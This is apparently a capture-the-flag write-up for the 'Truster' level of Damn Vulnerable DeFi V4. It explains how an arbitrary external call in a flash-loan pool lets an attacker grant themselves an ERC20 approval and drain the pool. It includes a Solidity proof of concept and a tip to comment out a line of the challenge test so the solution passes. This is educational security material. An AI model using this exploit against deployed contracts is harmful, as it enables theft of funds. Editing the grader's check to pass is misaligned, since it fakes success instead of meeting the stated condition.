# Truster

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

#


# Challenge Overview



**[original site](https://www.damnvulnerabledefi.xyz/challenges/truster)**  


I am trying to reduce fluffs and indirect stuffs as much as posible


## Let’s dive

The **[Truster](https://www.damnvulnerabledefi.xyz/challenges/truster)** challenge is the third level in the **Damn Vulnerable DeFi V4** series. The goal is simple: Drain all the funds from the pool.

Let’s go to the source code:


![fig2](https://miro.medium.com/v2/resize:fit:700/1*JDdsvmhs973mVauCIM-IhA.png)

**fig2: source code**

This pool has only 37 line of code..

If we have a look at the line 29, there is an open external low level arbitrary call. That means we can craft some code and try to manipulate it.

Wait there is a catch. If we drain the code at the flash loan execution, it is gonna revert because at last it is checking the last balance and before balance is equal or not and if it is not ecqual it reverts.

We can use some backddoors to bypass it.

> *(There is no restriction how much u can borrow or how minimum amount is, we can use underflow too but the solidity version doesnot allows us).*

So, first of all we will borrow 0eth and execute it. After the execution we will expolit it with crafted backdoor as arbitrary input in the pool by using the *approve* feature of ERC20.

## Here is the POC

```solidity
function test_truster() public checkSolvedByPlayer {
        bytes memory data = abi.encodeCall(
            token.approve,
            (player, TOKENS_IN_POOL)
        );

        pool.flashLoan(0,address(this), address(token), data);

        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
```

##### Note : The player nounce will not be updated. So, comment or remove the line 69 of the `Truster.t.sol` to pass it or do the activity in another contract and just call the contract inside `test_truster` function and thank me later ```

## Things to learn

- Never trust arbitrary external calls.
- `approve()` changes allowances, not balances.
- `transferFrom()` spends someone else's approved tokens.
- Always ask who controls the calldata.

## We should not do these on real prject

- Never allow arbitrary external calls.
- Carefully consider who controls calldata.
- Flash loans are not dangerous by themselves; the surrounding logic is.


If you found this write up ueful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**